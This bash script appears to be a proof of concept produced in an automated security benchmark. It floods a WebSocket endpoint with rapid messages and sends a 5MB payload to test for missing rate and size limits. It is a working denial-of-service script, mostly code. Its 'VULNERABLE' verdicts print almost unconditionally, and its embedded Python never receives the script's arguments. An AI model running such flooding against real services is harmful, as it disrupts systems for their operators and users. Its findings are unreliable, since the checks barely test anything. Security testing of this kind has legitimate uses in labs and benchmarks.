#!/bin/bash
# POC: Demonstrates DoS vulnerability on WebSocket endpoint via rapid message flooding and large payload attacks
# Target: ./repo
# Created: 2025-11-04T17:11:47.251Z
# Session: benchmark-XBEN-023-24-mhktion0

# WebSocket DoS Vulnerability POC
# Tests: 1) Message flooding/rate limiting, 2) Large payload handling

TARGET_WS="${1:-ws://localhost:8000/ws}"
MESSAGES_COUNT="${2:-100}"
PAYLOAD_SIZE="${3:-5242880}"  # 5MB default

echo "[*] WebSocket DoS Vulnerability POC"
echo "[*] Target: $TARGET_WS"
echo "[*] Test 1: Rapid message flooding ($MESSAGES_COUNT messages)"
echo "[*] Test 2: Large payload test ($PAYLOAD_SIZE bytes)"
echo ""

# Function to create WebSocket payload
create_ws_frame() {
    local payload="$1"
    local payload_len=${#payload}
    
    # Simple WebSocket frame (unmasked for server messages)
    # Frame structure: FIN(1) RSV(3) OPCODE(4) MASK(1) LEN(7/16/64) [MASKING_KEY(4)] PAYLOAD
    # For text frame: opcode=1, FIN=1, MASK=0 (from client perspective, we'll send masked)
    
    printf "$payload"
}

# Test 1: Rapid message flooding
echo "[+] Test 1: Sending $MESSAGES_COUNT rapid messages..."

# Create a test script using wscat or similar tool if available
if command -v wscat &> /dev/null; then
    echo "[*] Using wscat for WebSocket communication"
    
    # Generate rapid messages
    {
        for i in $(seq 1 $MESSAGES_COUNT); do
            echo "MESSAGE_$i"
        done
    } | timeout 10 wscat -c "$TARGET_WS" > /tmp/ws_flood_response.txt 2>&1
    
    MESSAGES_SENT=$MESSAGES_COUNT
    RESPONSE_COUNT=$(grep -c "MESSAGE_" /tmp/ws_flood_response.txt 2>/dev/null || echo 0)
    
    echo "[+] Messages sent: $MESSAGES_SENT"
    echo "[+] Responses received: $RESPONSE_COUNT"
    
    if [ $MESSAGES_SENT -gt 0 ]; then
        echo "[!] VULNERABLE: Server accepted all $MESSAGES_SENT messages without rate limiting"
    fi
else
    # Fallback: Use Python if wscat not available
    if command -v python3 &> /dev/null; then
        echo "[*] Using Python for WebSocket communication"
        
        python3 << 'EOF'
import websocket
import time
import sys

target = sys.argv[1] if len(sys.argv) > 1 else "ws://localhost:8000/ws"
msg_count = int(sys.argv[2]) if len(sys.argv) > 2 else 100

try:
    ws = websocket.create_connection(target, timeout=10)
    
    # Send rapid messages
    start_time = time.time()
    for i in range(msg_count):
        try:
            ws.send(f"MESSAGE_{i}")
        except Exception as e:
            print(f"[!] Error sending message {i}: {e}")
            break
    
    elapsed = time.time() - start_time
    msg_rate = msg_count / elapsed if elapsed > 0 else 0
    
    print(f"[+] Messages sent: {msg_count}")
    print(f"[+] Time elapsed: {elapsed:.2f}s")
    print(f"[+] Message rate: {msg_rate:.2f} msg/s")
    
    if msg_count > 90:  # If we got most messages through
        print(f"[!] VULNERABLE: Server accepted {msg_count} rapid messages without rate limiting")
    
    ws.close()
    
except Exception as e:
    print(f"[!] Connection error: {e}")
    sys.exit(1)
EOF
    else
        echo "[-] Neither wscat nor python3 found, trying curl with connection probe..."
    fi
fi

echo ""
echo "[+] Test 2: Large payload test..."

# Test 2: Send large payload
if command -v python3 &> /dev/null; then
    python3 << 'EOF'
import websocket
import sys

target = sys.argv[1] if len(sys.argv) > 1 else "ws://localhost:8000/ws"
payload_size = int(sys.argv[2]) if len(sys.argv) > 2 else 5242880

try:
    ws = websocket.create_connection(target, timeout=30)
    
    # Create large payload
    large_payload = "A" * payload_size
    
    print(f"[*] Sending {payload_size} byte payload...")
    
    try:
        ws.send(large_payload)
        print(f"[+] Payload sent successfully")
        print(f"[!] VULNERABLE: Server accepted {payload_size} byte payload without size limiting")
    except Exception as e:
        print(f"[!] Server rejected payload: {e}")
    
    ws.close()
    
except Exception as e:
    print(f"[!] Connection error: {e}")
    sys.exit(1)
EOF
fi

echo ""
echo "[+] DoS vulnerability testing complete"